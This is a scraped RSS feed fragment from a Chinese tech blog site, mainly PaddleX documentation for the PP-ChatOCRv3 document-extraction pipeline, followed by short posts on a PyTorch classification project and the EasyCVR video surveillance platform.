Intel® Xeon® Gold 5117 CPU @ 2.00GHz，线程数为 8，精度类型为 FP32。2. 快速开始PaddleX 所提供的预训练的模型产线均可以快速体验效果，你可以在线体验文档场景信息抽取v3产线的效果，也可以在本地使用 Python 体验文档场景信息抽取v3产线的效果。2.1 在线体验您可以在线体验文档场景信息抽取v3产线的效果，用官方提供的 Demo 图片进行识别，例如：如果您对产线运行的效果满意，可以直接对产线进行集成部署，如果不满意，您也可以利用私有数据对产线中的模型进行在线微调。2.2 本地体验在本地使用文档场景信息抽取v3产线前，请确保您已经按照PaddleX本地安装教程完成了PaddleX的wheel包安装。几行代码即可完成产线的快速推理，使用 测试文件，以通用文档场景信息抽取v3产线为例：frompaddleximportcreate_pipelinepipeline=create_pipeline(pipeline="PP-ChatOCRv3-doc",llm_name="ernie-3.5",llm_params={"api_type":"qianfan","ak":"","sk":""}# 请填入您的ak与sk，否则无法调用大模型# llm_params={"api_type": "aistudio", "access_token": ""} # 请填入您的access_token，否则无法调用大模型)visual_result,visual_info=pipeline.visual_predict("https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/contract.pdf")forresinvisual_result:res.save_to_img("./output")res.save_to_html('./output')res.save_to_xlsx('./output')vector=pipeline.build_vector(visual_info=visual_info)chat_result=pipeline.chat(key_list=["乙方","手机号"],visual_info=visual_info,vector=vector,)chat_result.print()注：目前仅支持文心大模型，支持在百度云千帆平台或者星河社区 AIStudio上获取相关的 ak/sk(access_token)。如果使用百度云千帆平台，可以参考AK和SK鉴权调用API流程 获取ak/sk，如果使用星河社区 AIStudio，可以在星河社区 AIStudio 访问令牌中获取 access_token。运行后，输出结果如下：{'chat_res': {'乙方': '股份测试有限公司', '手机号': '19331729920'}, 'prompt': ''}在上述 Python 脚本中，执行了如下四个步骤：（1）调用create_pipeline方法实例化文档场景信息抽取v3产线对象，相关参数说明如下：参数参数类型默认值参数说明pipelinestr无产线名称或是产线配置文件路径，如为产线名称，则必须为 PaddleX 所支持的产线；llm_namestr“ernie-3.5”大语言模型名称，目前支持ernie-4.0，ernie-3.5，更多模型支持中;llm_paramsdict{}LLM相关API配置；devicestr、NoneNone运行设备（None为自动适配）；（2）调用文档场景信息抽取v3产线对象的visual_predict方法进行视觉推理预测，相关参数说明如下：参数参数类型默认值参数说明inputPython Var无用于输入待预测数据，支持直接传入Python变量，如numpy.ndarray表示的图像数据；inputstr无用于输入待预测数据，支持传入待预测数据文件路径，如图像文件的本地路径：/root/data/img.jpg；inputstr无用于输入待预测数据，支持传入待预测数据文件url，如https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/contract.pdf；inputstr无用于输入待预测数据，支持传入本地目录，该目录下需包含待预测数据文件，如本地路径：/root/data/；inputdict无用于输入待预测数据，支持传入字典类型，字典的key需要与具体产线对应，如文档场景信息抽取v3产线为"img"，字典的val支持上述类型数据，如：{"img": "/root/data1"}；inputlist无用于输入待预测数据，支持传入列表，列表元素需为上述类型数据，如[numpy.ndarray, numpy.ndarray]，["/root/data/img1.jpg", "/root/data/img2.jpg"]，["/root/data1", "/root/data2"]，[{"img": "/root/data1"}, {"img": "/root/data2/img.jpg"}]；use_doc_image_ori_cls_modelboolTrue是否使用方向分类模型；use_doc_image_unwarp_modelboolTrue是否使用版面矫正产线；use_seal_text_det_modelboolTrue是否使用弯曲文本检测产线；（3）调用视觉推理预测结果对象的相关方法对视觉推理预测结果进行保存，具体方法如下：方法参数方法说明save_to_imgsave_path将OCR预测结果、版面分析结果、表格识别结果保存为图片文件，参数save_path用于指定保存的路径；save_to_htmlsave_path将表格识别结果保存为html文件，参数save_path用于指定保存的路径；save_to_xlsxsave_path将表格识别结果保存为xlsx文件，参数save_path用于指定保存的路径；（4）调用文档场景信息抽取v3产线对象的chat方法与大模型进行交互，相关参数说明如下：参数参数类型默认值参数说明key_liststr无用于查询的关键字（query）；支持“，”或“,”作为分隔符的多个关键字组成的字符串，如“乙方，手机号”；key_listlist无用于查询的关键字（query），支持list形式表示的一组关键字，其元素为str类型；在执行上述 Python 脚本时，加载的是默认的文档场景信息抽取v3产线配置文件，若您需要自定义配置文件，可执行如下命令获取：paddlex --get_pipeline_config PP-ChatOCRv3-doc执行后，文档场景信息抽取v3产线配置文件将被保存在当前路径。若您希望自定义保存位置，可执行如下命令（假设自定义保存位置为./my_path）：paddlex --get_pipeline_config PP-ChatOCRv3-doc --save_path ./my_path获取配置文件后，您即可对文档场景信息抽取v3产线各项配置进行自定义：Pipeline:layout_model:RT-DETR-H_layout_3clstable_model:SLANet_plustext_det_model:PP-OCRv4_server_dettext_rec_model:PP-OCRv4_server_recseal_text_det_model:PP-OCRv4_server_seal_detdoc_image_ori_cls_model:nulldoc_image_unwarp_model:nullllm_name:"ernie-3.5"llm_params:api_type:qianfanak:sk:在上述配置中，您可以修改产线各模块加载的模型，也可以修改使用的大模型。各模块支持模型列表请参考模块文档，大模型支持列表为：ernie-4.0、ernie-3.5、ernie-3.5-8k、ernie-lite、ernie-tiny-8k、ernie-speed、ernie-speed-128k、ernie-char-8k。修改后，只需要修改create_pipeline方法中的pipeline参数值为产线配置文件路径即可应用配置。例如，若您的配置文件保存在./my_path/PP-ChatOCRv3-doc.yaml，则只需执行：frompaddleximportcreate_pipelinepipeline=create_pipeline(pipeline="./my_path/PP-ChatOCRv3-doc.yaml",llm_name="ernie-3.5",llm_params={"api_type":"qianfan","ak":"","sk":""}# 请填入您的ak与sk，否则无法调用大模型# llm_params={"api_type": "aistudio", "access_token": ""} # 请填入您的access_token，否则无法调用大模型)visual_result,visual_info=pipeline.visual_predict("https://paddle-model-ecology.bj.bcebos.com/paddlex/imgs/demo_image/contract.pdf")forresinvisual_result:res.save_to_img("./output")res.save_to_html('./output')res.save_to_xlsx('./output')vector=pipeline.build_vector(visual_info=visual_info)chat_result=pipeline.chat(key_list=["乙方","手机号"],visual_info=visual_info,vector=vector,)chat_result.print()3. 开发集成/部署如果产线可以达到您对产线推理速度和精度的要求，您可以直接进行开发集成/部署。若您需要将产线直接应用在您的Python项目中，可以参考 2.2 本地体验中的示例代码。此外，PaddleX 也提供了其他三种部署方式，详细说明如下：🚀高性能推理：在实际生产环境中，许多应用对部署策略的性能指标（尤其是响应速度）有着较严苛的标准，以确保系统的高效运行与用户体验的流畅性。为此，PaddleX 提供高性能推理插件，旨在对模型推理及前后处理进行深度性能优化，实现端到端流程的显著提速，详细的高性能推理流程请参考PaddleX高性能推理指南。☁️服务化部署：服务化部署是实际生产环境中常见的一种部署形式。通过将推理功能封装为服务，客户端可以通过网络请求来访问这些服务，以获取推理结果。PaddleX 支持用户以低成本实现产线的服务化部署，详细的服务化部署流程请参考PaddleX服务化部署指南。下面是API参考和多语言服务调用示例：API参考对于服务提供的所有操作：响应体以及POST请求的请求体均为JSON数据（JSON对象）。当请求处理成功时，响应状态码为200，响应体的属性如下：名称类型含义errorCodeinteger错误码。固定为0。errorMsgstring错误说明。固定为"Success"。响应体还可能有result属性，类型为object，其中存储操作结果信息。当请求处理未成功时，响应体的属性如下：名称类型含义errorCodeinteger错误码。与响应状态码相同。errorMsgstring错误说明。服务提供的操作如下：analyzeImage使用计算机视觉模型对图像进行分析，获得OCR、表格识别结果等，并提取图像中的关键信息。POST /chatocr-vision请求体的属性如下：名称类型含义是否必填filestring服务可访问的图像文件或PDF文件的URL，或上述类型文件内容的Base64编码结果。对于超过10页的PDF文件，只有前10页的内容会被使用。是fileTypeinteger文件类型。0表示PDF文件，1表示图像文件。若请求体无此属性，则服务将尝试根据URL自动推断文件类型。否useImgOrientationClsboolean是否启用文档图像方向分类功能。默认启用该功能。否useImgUnwrappingboolean是否启用文本图像矫正功能。默认启用该功能。否useSealTextDetboolean是否启用印章文本检测功能。默认启用该功能。否inferenceParamsobject推理参数。否inferenceParams的属性如下：名称类型含义是否必填maxLongSideinteger推理时，若文本检测模型的输入图像较长边的长度大于maxLongSide，则将对图像进行缩放，使其较长边的长度等于maxLongSide。否请求处理成功时，响应体的result具有如下属性：名称类型含义visionResultsarray使用计算机视觉模型得到的分析结果。数组长度为1（对于图像输入）或文档页数与10中的较小者（对于PDF输入）。对于PDF输入，数组中的每个元素依次表示PDF文件中每一页的处理结果。visionInfoobject图像中的关键信息，可用作其他操作的输入。visionResults中的每个元素为一个object，具有如下属性：名称类型含义textsarray文本位置、内容和得分。tablesarray表格位置和内容。inputImagestring输入图像。图像为JPEG格式，使用Base64编码。ocrImagestringOCR结果图。图像为JPEG格式，使用Base64编码。layoutImagestring版面区域检测结果图。图像为JPEG格式，使用Base64编码。texts中的每个元素为一个object，具有如下属性：名称类型含义polyarray文本位置。数组中元素依次为包围文本的多边形的顶点坐标。textstring文本内容。scorenumber文本识别得分。tables中的每个元素为一个object，具有如下属性：名称类型含义bboxarray表格位置。数组中元素依次为边界框左上角x坐标、左上角y坐标、右下角x坐标以及右下角y坐标。htmlstringHTML格式的表格识别结果。buildVectorStore构建向量数据库。POST /chatocr-vector请求体的属性如下：名称类型含义是否必填visionInfoobject图像中的关键信息。由analyzeImage操作提供。是minCharsinteger启用向量数据库的最小数据长度。否llmRequestIntervalnumber调用大语言模型API的间隔时间。否llmNamestring大语言模型名称。否llmParamsobject大语言模型API参数。否当前，llmParams可以采用如下形式：{"apiType":"qianfan","apiKey":"{千帆平台API key}","secretKey":"{千帆平台secret key}"}请求处理成功时，响应体的result具有如下属性：名称类型含义vectorStorestring向量数据库序列化结果，可用作其他操作的输入。retrieveKnowledge进行知识检索。POST /chatocr-retrieval请求体的属性如下：名称类型含义是否必填keysarray关键词列表。是vectorStorestring向量数据库序列化结果。由buildVectorStore操作提供。是llmNamestring大语言模型名称。否llmParamsobject大语言模型API参数。否当前，llmParams可以采用如下形式：{"apiType":"qianfan","apiKey":"{千帆平台API key}","secretKey":"{千帆平台secret key}"}请求处理成功时，响应体的result具有如下属性：名称类型含义retrievalResultstring知识检索结果，可用作其他操作的输入。chat与大语言模型交互，利用大语言模型提炼关键信息。POST /chatocr-vision请求体的属性如下：名称类型含义是否必填keysarray关键词列表。是visionInfoobject图像中的关键信息。由analyzeImage操作提供。是taskDescriptionstring提示词任务。否rulesstring提示词规则。用于自定义信息抽取规则，例如规范输出格式。否fewShotstring提示词示例。否vectorStorestring向量数据库序列化结果。由buildVectorStore操作提供。否retrievalResultstring知识检索结果。由retrieveKnowledge操作提供。否returnPromptsboolean是否返回使用的提示词。默认启用。否llmNamestring大语言模型名称。否llmParamsobject大语言模型API参数。否当前，llmParams可以采用如下形式：{"apiType":"qianfan","apiKey":"{千帆平台API key}","secretKey":"{千帆平台secret key}"}请求处理成功时，响应体的result具有如下属性：名称类型含义chatResultobject关键信息抽取结果。promptsobject使用的提示词。prompts的属性如下：名称类型含义ocrstringOCR提示词。tablestring表格提示词。htmlstringHTML提示词。多语言调用服务示例 Pythonimportbase64importpprintimportsysimportrequestsAPI_BASE_URL="http://0.0.0.0:8080"API_KEY="{千帆平台API key}"SECRET_KEY="{千帆平台secret key}"LLM_NAME="ernie-3.5"LLM_PARAMS={"apiType":"qianfan","apiKey":API_KEY,"secretKey":SECRET_KEY,}file_path="./demo.jpg"keys=["电话"]withopen(file_path,"rb")asfile:file_bytes=file.read()file_data=base64.b64encode(file_bytes).decode("ascii")payload={"file":file_data,"fileType":1,"useImgOrientationCls":True,"useImgUnwrapping":True,"useSealTextDet":True,}resp_vision=requests.post(url=f"{API_BASE_URL}/chatocr-vision",json=payload)ifresp_vision.status_code!=200:print(f"Request to chatocr-vision failed with status code{resp_vision.status_code}.")pprint.pp(resp_vision.json())sys.exit(1)result_vision=resp_vision.json()["result"]fori,resinenumerate(result_vision["visionResults"]):print("Texts:")pprint.pp(res["texts"])print("Tables:")pprint.pp(res["tables"])ocr_img_path=f"ocr_{i}.jpg"withopen(ocr_img_path,"wb")asf:f.write(base64.b64decode(res["ocrImage"]))layout_img_path=f"layout_{i}.jpg"withopen(layout_img_path,"wb")asf:f.write(base64.b64decode(res["layoutImage"]))print(f"Output images saved at{ocr_img_path}and{layout_img_path}")payload={"visionInfo":result_vision["visionInfo"],"minChars":200,"llmRequestInterval":1000,"llmName":LLM_NAME,"llmParams":LLM_PARAMS,}resp_vector=requests.post(url=f"{API_BASE_URL}/chatocr-vector",json=payload)ifresp_vector.status_code!=200:print(f"Request to chatocr-vector failed with status code{resp_vector.status_code}.")pprint.pp(resp_vector.json())sys.exit(1)result_vector=resp_vector.json()["result"]payload={"keys":keys,"vectorStore":result_vector["vectorStore"],"llmName":LLM_NAME,"llmParams":LLM_PARAMS,}resp_retrieval=requests.post(url=f"{API_BASE_URL}/chatocr-retrieval",json=payload)ifresp_retrieval.status_code!=200:print(f"Request to chatocr-retrieval failed with status code{resp_retrieval.status_code}.")pprint.pp(resp_retrieval.json())sys.exit(1)result_retrieval=resp_retrieval.json()["result"]payload={"keys":keys,"visionInfo":result_vision["visionInfo"],"taskDescription":"","rules":"","fewShot":"","vectorStore":result_vector["vectorStore"],"retrievalResult":result_retrieval["retrievalResult"],"returnPrompts":True,"llmName":LLM_NAME,"llmParams":LLM_PARAMS,}resp_chat=requests.post(url=f"{API_BASE_URL}/chatocr-chat",json=payload)ifresp_chat.status_code!=200:print(f"Request to chatocr-chat failed with status code{resp_chat.status_code}.")pprint.pp(resp_chat.json())sys.exit(1)result_chat=resp_chat.json()["result"]print("\nPrompts:")pprint.pp(result_chat["prompts"])print("Final result:")print(result_chat["chatResult"])注：请在API_KEY、SECRET_KEY处填入您的 API key 和 secret key。📱端侧部署：端侧部署是一种将计算和数据处理功能放在用户设备本身上的方式，设备可以直接处理数据，而不需要依赖远程的服务器。PaddleX 支持将模型部署在 Android 等端侧设备上，详细的端侧部署流程请参考PaddleX端侧部署指南。您可以根据需要选择合适的方式部署模型产线，进而进行后续的 AI 应用集成。4. 二次开发如果通用文档场景信息抽取v3产线提供的默认模型权重在您的场景中，精度或速度不满意，您可以尝试利用您自己拥有的特定领域或应用场景的数据对现有模型进行进一步的微调，以提升通用表格识别产线的在您的场景中的识别效果。4.1 模型微调由于通用文档场景信息抽取v3产线包含六个模块，模型产线的效果不及预期可能来自于其中任何一个模块（文本图像矫正模块暂不支持二次开发）。您可以对识别效果差的图片进行分析，参考如下规则进行分析和模型微调：检测到的表格结构错误（如行列识别错误、单元格位置错误），那么可能是表格结构识别模块存在不足，您需要参考表格结构识别模块开发教程中的二次开发章节，使用您的私有数据集对表格结构识别模型进行微调。版面中存在定位错误（例如对表格、印章的位置识别错误），那么可能是版面区域定位模块存在不足，您需要参考版面区域检测模块开发教程中的二次开发章节，使用您的私有数据集对版面区域定位模型进行微调。有较多的文本未被检测出来（即文本漏检现象），那么可能是文本检测模型存在不足，您需要参考文本检测模块开发教程中的二次开发章节，使用您的私有数据集对文本检测模型进行微调。已检测到的文本中出现较多的识别错误（即识别出的文本内容与实际文本内容不符），这表明文本识别模型需要进一步改进，您需要参考文本识别模块开发教程中的二次开发章节对文本识别模型进行微调。已检测到的印章文本出现较多的识别错误，这表明印章文本检测模块模型需要进一步改进，您需要参考印章文本检测模块开发教程中的二次开发章节对印章文本检测模型进行微调。含文字区域的文档或证件的方向存在较多的识别错误，这表明文档图像方向分类模型需要进一步改进，您需要参考文档图像方向分类模块开发教程中的二次开发章节对文档图像方向分类模型进行微调。4.2 模型应用当您使用私有数据集完成微调训练后，可获得本地模型权重文件。若您需要使用微调后的模型权重，只需对产线配置文件做修改，将微调后模型权重的本地路径替换至产线配置文件中的对应位置即可：......
Pipeline:layout_model: RT-DETR-H_layout_3cls  #可修改为微调后模型的本地路径table_model: SLANet_plus  #可修改为微调后模型的本地路径text_det_model: PP-OCRv4_server_det  #可修改为微调后模型的本地路径text_rec_model: PP-OCRv4_server_rec  #可修改为微调后模型的本地路径seal_text_det_model: PP-OCRv4_server_seal_det  #可修改为微调后模型的本地路径doc_image_ori_cls_model: null   #可修改为微调后模型的本地路径doc_image_unwarp_model: null   #可修改为微调后模型的本地路径
......随后， 参考本地体验中的命令行方式或 Python 脚本方式，加载修改后的产线配置文件即可。5. 多硬件支持PaddleX 支持英伟达 GPU、昆仑芯 XPU、昇腾 NPU 和寒武纪 MLU 等多种主流硬件设备，仅需设置device参数即可完成不同硬件之间的无缝切换。例如，使用文档场景信息抽取v3产线时，将运行设备从英伟达 GPU 更改为昇腾 NPU，仅需将脚本中的device修改为 npu 即可：frompaddleximportcreate_pipeline
pipeline=create_pipeline(pipeline="PP-ChatOCRv3-doc",llm_name="ernie-3.5",llm_params={"api_type":"qianfan","ak":"","sk":""},device="npu:0"# gpu:0 --&gt; npu:0)若您想在更多种类的硬件上使用通用文档场景信息抽取产线，请参考PaddleX多硬件使用指南。http://www.ppmy.cn/news/1540901.html相关文章简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
物体识别分类&amp;#xff0c;pytorch 目前数据集 
包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...RabbitMQ 中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:17 +0000</pubDate>
    </item>
    <item>
      <title>简单易用的分类任务开源项目 ：classification</title>
      <link>https://www.ppmy.cn/news/1540900.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维简单易用的分类任务开源项目 ：classificationnews/2025/10/31 23:19:15/项目地址：https://gitcode.net/EricLee/classification物体识别分类，pytorch 目前数据集包括 1）Stanford Dogs 数据集 ，2）14类静态手势自建数据集，3）imagenet 1000类数据集classification物体识别分类项目介绍该项目对物体进行识别分类。项目配置作者开发环境：Python 3.7PyTorch &gt;= 1.5.1数据集1、Stanford Dogs 数据集2、静态手势识别数据集（handpose_x_gesture_v1）3、imagenet 数据集 （使用“ILSVRC2012_img_train”数据集将原图裁剪后的部分数据集）4、Stanford_Cars 数据集(共196 类)构建自己的数据集构建一个总的数据集目录，在目录内建立每一个具体类别的子目录，每一个子目录有且只有单独的一个类别。并且文件夹的命名为“数字-名称”，比如上图的“one静态手势”的文件夹命名为“000-one”。注意名称为英文命名，可以由自己定义，类别编号数字从0开始。另外在具体训练时，需要在训练脚本 train.py 中进行训练集文件夹路径和类别数的对应修改。预训练模型1、Stanford Dogs 预训练模型2、静态手势识别预训练模型（handpose_x_gesture_v1）3、imagenet 预训练模型具体分类看json信息即"imagenet_msg.json"，运行 read_imagenet_msg.py 读取。"chinese_name"为类别中文名字，"doc_name"为数据集对应的每一类文件夹名字，前面的数字为模型的类别号从 "0"~"999"，共 1000 类 。4、Stanford_Cars 预训练模型项目使用方法模型训练注意: train.py 中的 3个参数与具体分类任务数据集，息息相关，如下所示：#---------------------------------------------------------------------------------parser.add_argument('--train_path', type=str, default = './handpose_x_gesture_v1/',help = 'train_path') # 训练集路径parser.add_argument('--num_classes', type=int , default = 14,help = 'num_classes') #  分类类别个数,gesture 配置为 14 ， Stanford Dogs 配置为 120 ， imagenet 配置为 1000parser.add_argument('--have_label_file', type=bool, default = False,help = 'have_label_file') # 是否有配套的标注文件解析才能生成分类训练样本，gesture 配置为 False ， Stanford Dogs 配置为 True根目录下运行命令： python train.py (注意脚本内相关参数配置 )模型推理根目录下运行命令： python inference.py (注意脚本内相关参数配置 )http://www.ppmy.cn/news/1540900.html相关文章从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...RabbitMQ 中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...Cocos Creator导出obj文件用于后端寻路Cocos Creator 3.8.0 
用这个扩展插件 
【杨宗宝】两年前写的网格工具&amp;#xff0c;今天将它开源了。 - Creator 3.x - Cocos中文社区carlosyzy_extensions_mesh: Cocos Creator 3.x mesh插件&amp;#xff0c;负责网格数据的导出。合并&amp;#xff0c;拆封等一系列操作 (gitee.com) 
下…阅读更多...DB2数据库学习（一）启动DB2数据步骤 
1 切换到用户db2inst1 1. 用户权限 实例用户: DB2 在安装时会为每个数据库实例创建一个专用的操作系统用户&amp;#xff08;如 db2inst1&amp;#xff09;。这个用户拥有管理该实例所需的特定权限。 安全性: 通过限制数据库实例的管理操作&amp;#xff08;如启动和停止&amp;…阅读更多...二叉树习题其二Java【力扣】【算法学习day.9】前言 
前言 书接上篇文章二叉树习题其一&amp;#xff0c;这篇文章我们将基础拓展 
###我做这类文档一个重要的目的还是给正在学习的大家提供方向&amp;#xff08;例如想要掌握基础用法&amp;#xff0c;该刷哪些题&amp;#xff1f;&amp;#xff09;我的解析也不会做的非常详细&amp;#xff0c;只会提供思…阅读更多...03 设计模式-创造型模式-单例模式单例模式&amp;#xff08;Singleton Pattern&amp;#xff09;是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式&amp;#xff0c;它提供了一种创建对象的最佳方式。 
这种模式涉及到一个单一的类&amp;#xff0c;该类负责创建自己的对象&amp;#xff0c;同时确保只有单个对象被创建…阅读更多...「漏洞复现」英飞达医学影像存档与通信系统 WebUserLogin.asmx 信息泄露漏洞0x01 免责声明 
请勿利用文章内的相关技术从事非法测试&amp;#xff0c;由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失&amp;#xff0c;均由使用者本人负责&amp;#xff0c;作者不为此承担任何责任。工具来自网络&amp;#xff0c;安全性自测&amp;#xff0c;如有侵权请联系删…阅读更多...Linux下压缩与解压缩命令大全【详解】&amp;#x1f468;‍&amp;#x1f393;博主简介 &amp;#x1f3c5;CSDN博客专家   &amp;#x1f3c5;云计算领域优质创作者   &amp;#x1f3c5;华为云开发者社区专家博主   &amp;#x1f3c5;阿里云开发者社区专家博主 &amp;#x1f48a;交流社区&amp;#xff1a;运维交流社区 欢迎大家的加入&amp;#xff01…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:15 +0000</pubDate>
    </item>
    <item>
      <title>从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥</title>
      <link>https://www.ppmy.cn/news/1540899.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥news/2025/10/31 23:19:14/视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法，能够实现行为分析、人脸识别和异常事件检测等功能，提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护，还扩展到了交通管理、零售分析和智慧城市应用中。EasyCVR视频汇聚平台的智能化管理主要通过以下几个方面的技术支持来实现：1）多协议接入能力安防综合管理EasyCVR平台支持多种视频流媒体协议，包括国标GB/T28181、GA/T1400、部标JT808、RTMP、RTSP/Onvif协议，以及多家知名厂商的私有协议与SDK（如海康、大华、宇视、华为等）。这种广泛的兼容性使得EasyCVR能够轻松整合各种分散的视频资源，构建统一的视频监控系统。2）实时监控与远程查看EasyCVR能够实时处理来自不同源的视频流，用户可以通过多种终端设备随时随地查看监控画面，不受地域限制。平台支持7/24小时实时高清视频监控，能同时播放多路监控视频流，视频画面1、4、9、16个可选，支持自定义视频轮播。3）视频存储与回放EasyCVR支持录像功能，可以根据业务场景进行7*24小时录像或自定义时间段录像，并将录像存储在云端或本地服务器上。用户可以根据需要随时回放监控录像，以查找线索或了解事件发生的全过程。4）智能分析与预警视频监控EasyCVR支持AI智能分析能力的接入，能够接收来自边缘AI设备或AI视频智能分析系统推送的告警消息，如车辆违停、人员入侵、未戴安全帽等，并能发送告警消息给管理人员，以便及时进行处理。告警信息支持检索、查看与下载。5）可视化管理与操作智能分析EasyCVR视频监控平台提供直观的可视化管理界面，可以直观展现设备接入、运行、存储及视频智能分析的结果与预警数据统计等，全局掌握监控区域的安全隐患监测情况。同时，如果前端接入的设备具备云台功能，则可以在平台进行云台控制，支持PTZ控制镜头调焦和转向等操作。6）跨平台数据整合EasyCVR提供丰富的API接口及SDK等，可以轻松与第三方集成，将可视化视频监控平台集成至用户已有的业务平台中，实现跨平台多系统数据整合应用。7）云边端一体化架构安防监控EasyCVR视频汇聚管理平台支持云、边、端三级架构的部署模式，能够在云端进行视频资源的统一管理和调度；在边缘端，通过部署边缘计算节点实现低延迟的视频处理和智能分析；在终端侧，则负责视频采集和传输。通过这些技术，EasyCVR平台不仅能够实现视频资源的高效汇聚和管理，还能通过智能分析和预警功能，提高监控系统的智能化水平，从而为用户提供一个可靠、安全、高效的视频监控解决方案。http://www.ppmy.cn/news/1540899.html相关文章RabbitMQ 